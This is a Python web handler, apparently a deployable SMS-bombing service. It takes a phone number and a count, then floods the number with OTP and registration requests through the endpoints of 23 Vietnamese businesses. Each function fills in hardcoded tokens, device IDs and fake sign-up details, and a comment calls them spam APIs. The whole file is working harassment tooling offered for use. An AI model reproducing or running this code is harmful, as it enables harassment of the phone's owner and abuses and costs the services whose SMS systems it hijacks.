from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import json
import requests
from concurrent.futures import ThreadPoolExecutor
import time

threading = ThreadPoolExecutor(max_workers=10)

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        phone = params.get('phone', [''])[0]
        amount = int(params.get('amount', ['1'])[0])
        
        if amount > 10:
            amount = 10
        
        if not phone:
            self.send_response(400)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"error": "Thiếu SĐT"}).encode())
            return
        
        for i in range(amount):
            threading.submit(popeyes, phone)
            threading.submit(alfrescos, phone)
            threading.submit(tv360, phone)
            threading.submit(bibabo, phone)
            threading.submit(gapo, phone)
            threading.submit(vieon, phone)
            threading.submit(meta, phone)
            threading.submit(tamo, phone)
            threading.submit(fptshop, phone)
            threading.submit(viettel, phone)
            threading.submit(tgdd, phone)
            threading.submit(pizzahut, phone)
            threading.submit(concung, phone)
            threading.submit(nhathuoclongchau, phone)
            threading.submit(pharmacity, phone)
            threading.submit(ghn, phone)
            threading.submit(beecow, phone)
            threading.submit(thantaioilo, phone)
            threading.submit(vayvnd, phone)
            threading.submit(ecogreen, phone)
            threading.submit(phuclong, phone)
            threading.submit(winmart, phone)
            threading.submit(oldloship, phone)
            time.sleep(0.3)
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({
            "status": "success",
            "phone": phone,
            "amount": amount
        }, ensure_ascii=False).encode())

# ====== TẤT CẢ CÁC HÀM API SPAM ======

def popeyes(sdt):
    headers = {
        'Host': 'api.popeyes.vn',
        'accept': 'application/json',
        'x-client': 'WebApp',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'content-type': 'application/json',
        'origin': 'https://popeyes.vn',
        'referer': 'https://popeyes.vn/',
    }
    data = '{"phone":"' + sdt + '","firstName":"Cac","lastName":"Lo","email":"kong@gmail.com","password":"12345gdtg"}'
    try:
        requests.post('https://api.popeyes.vn/api/v1/register', headers=headers, data=data, timeout=3)
    except: pass

def alfrescos(sdt):
    headers = {
        'Host': 'api.alfrescos.com.vn',
        'accept': 'application/json',
        'brandcode': 'ALFRESCOS',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
        'content-type': 'application/json',
    }
    data = '{"phoneNumber":"' + sdt + '","secureHash":"66148faf3cab6e527b8b044745e27dbd","deviceId":"","sendTime":1693660146481,"type":1}'
    try:
        requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', headers=headers, data=data, timeout=3)
    except: pass

def tv360(phone):
    try:
        requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", 
            headers={"Content-Type": "application/json"},
            json={"msisdn":"0"+phone[1:11]}, timeout=3)
    except: pass

def bibabo(sdt):
    headers = {
        "Host": "bibabo.vn",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
        "Origin": "https://bibabo.vn",
        "Referer": "https://bibabo.vn/user/signupPhone",
    }
    data = {"phone": sdt, "token": "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"}
    try:
        requests.post("https://bibabo.vn/user/verify-phone", headers=headers, data=data, timeout=3)
    except: pass

def gapo(sdt):
    headers = {
        "Host": "api.gapo.vn",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
        "Origin": "https://www.gapo.vn",
    }
    data = {"device_id": "30a1bfa0-533f-45e9-be60-b48fb8977df2", "phone_number": "+84-" + sdt[1:11], "otp_type": 0}
    try:
        requests.post("https://api.gapo.vn/auth/v2.0/signup", headers=headers, data=json.dumps(data), timeout=3)
    except: pass

def vieon(sdt):
    headers = {
        'Host': 'api.vieon.vn',
        'accept': 'application/json',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://vieon.vn',
        'referer': 'https://vieon.vn/',
    }
    params = {'platform': 'mobile_web', 'ui': '012021'}
    data = {'phone_number': sdt, 'password': '1234gdtg', 'device_id': '57f3ffd77ad209a626c1ea607d0c4775', 'platform': 'mobile_web', 'ui': '012021'}
    try:
        requests.post('https://api.vieon.vn/backend/user/register/mobile', params=params, headers=headers, data=data, timeout=3)
    except: pass

def meta(sdt):
    headers = {
        'Host': 'meta.vn',
        'accept': 'application/json',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
        'content-type': 'application/json',
        'origin': 'https://meta.vn',
        'referer': 'https://meta.vn/account/register',
    }
    data = '{"api_args":{"lgUser":"' + sdt + '","act":"send","type":"phone"},"api_method":"CheckExist"}'
    try:
        requests.post('https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1', headers=headers, data=data, timeout=3)
    except: pass

def tamo(phone):
    try:
        requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts",
            headers={"Content-Type": "application/json"},
            json={"mobilePhone":{"number":"0"+phone[1:11]}}, timeout=3)
    except: pass

def fptshop(phone):
    try:
        requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={"phone": phone}, timeout=3)
    except: pass

def viettel(phone):
    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://vietteltelecom.vn',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
    }
    try:
        requests.post('https://vietteltelecom.vn/api/get-otp-login', headers=headers, json={'phone': phone, 'type': ''}, timeout=3)
    except: pass

def tgdd(sdt):
    headers = {
        'Host': 'www.thegioididong.com',
        'accept': '*/*',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.thegioididong.com',
    }
    data = {'phoneNumber': sdt, 'isReSend': 'false', 'sendOTPType': '1'}
    try:
        requests.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', headers=headers, data=data, timeout=3)
    except: pass

def pizzahut(sdt):
    headers = {
        "Host": "pizzahut.vn",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
        "Origin": "https://pizzahut.vn",
        "Referer": "https://pizzahut.vn/signup",
    }
    data = {"keyData": f"appID=vn.pizzahut&lang=Vi&ver=1.0.0&clientType=2&udId=%22%22&phone={sdt}"}
    try:
        requests.post("https://pizzahut.vn/callApiStorelet/user/registerRequest", headers=headers, data=json.dumps(data), timeout=3)
    except: pass

def concung(phone):
    headers = {
        "Host": "concung.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
        "Origin": "https://concung.com",
    }
    data = {"ajax": "1", "classAjax": "AjaxLogin", "methodAjax": "sendOtpLogin", "customer_phone": phone}
    try:
        requests.post("https://concung.com/ajax.html", data=data, headers=headers, timeout=3)
    except: pass

def nhathuoclongchau(sdt):
    headers = {
        'Host': 'api.nhathuoclongchau.com.vn',
        'accept': 'application/json',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
        'content-type': 'application/json',
        'origin': 'https://nhathuoclongchau.com.vn',
    }
    data = '{"phoneNumber":"' + sdt + '","otpType":0,"fromSys":"WEBKHLC"}'
    try:
        requests.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', headers=headers, data=data, timeout=3)
    except: pass

def pharmacity(sdt):
    headers = {
        'Host': 'api-gateway.pharmacity.vn',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
        'content-type': 'application/json',
        'origin': 'https://www.pharmacity.vn',
    }
    data = '{"phone":"' + sdt + '","referral":""}'
    try:
        requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers, data=data, timeout=3)
    except: pass

def ghn(sdt):
    headers = {
        'Host': 'online-gateway.ghn.vn',
        'accept': 'application/json',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
        'content-type': 'application/json',
        'origin': 'https://sso.ghn.vn',
    }
    data = '{"phone":"' + sdt + '","type":"register"}'
    try:
        requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, data=data, timeout=3)
    except: pass

def beecow(sdt):
    headers = {
        'Host': 'api.beecow.com',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
        'origin': 'https://admin.gosell.vn',
    }
    data = '{"password":"12345cc@","displayName":"","locationCode":"VN-SG","langKey":"vi","mobile":{"countryCode":"+84","phoneNumber":"' + sdt + '"}}'
    try:
        requests.post('https://api.beecow.com/api/register/gosell', headers=headers, data=data, timeout=3)
    except: pass

def thantaioilo(phone):
    headers = {
        "Host": "api.thantaioi.vn",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
        "Origin": "https://thantaioi.vn",
    }
    try:
        requests.post("https://api.thantaioi.vn/api/user/send-one-time-password", 
            data=json.dumps({"phone": f"84{phone[1:11]}"}), headers=headers, timeout=3)
    except: pass

def vayvnd(sdt):
    headers = {
        'Host': 'api.vayvnd.vn',
        'accept': 'application/json',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
        'content-type': 'application/json',
        'origin': 'https://vayvnd.vn',
    }
    data = '{"phone":"' + sdt + '","utm":[{"utm_source":"google","utm_medium":"organic"}],"sourceSite":3}'
    try:
        requests.post('https://api.vayvnd.vn/v2/users', headers=headers, data=data, timeout=3)
    except: pass

def ecogreen(sdt):
    headers = {
        'Host': 'ecogreen.com.vn',
        'accept': 'application/json',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
        'content-type': 'application/json',
        'origin': 'https://ecogreen.com.vn',
    }
    data = '{"phone":"' + sdt + '"}'
    try:
        requests.post('https://ecogreen.com.vn/api/auth/register/send-otp', headers=headers, data=data, timeout=3)
    except: pass

def phuclong(sdt):
    headers = {
        'Host': 'api-crownx.winmart.vn',
        'accept': 'application/json',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36',
        'content-type': 'application/json',
        'origin': 'https://order.phuclong.com.vn',
    }
    data = '{"phoneNumber":"' + sdt + '","fullName":"Lo Cac","email":"KAka@gmail.com","password":"12345cc@@@"}'
    try:
        requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', headers=headers, data=data, timeout=3)
    except: pass

def winmart(sdt):
    try:
        requests.get(f'https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={sdt}',
            headers={'accept': 'application/json', 'user-agent': 'Mozilla/5.0'}, timeout=3)
    except: pass

def oldloship(phone):
    try:
        requests.post("https://mocha.lozi.vn/v6/invites/use-app",
            headers={"Content-Type": "application/json"},
            data=json.dumps({"device":"Android 8.1.0","platform":"Chrome","countryCode":"84","phoneNumber":phone[1:11]}), timeout=3)
    except: pass
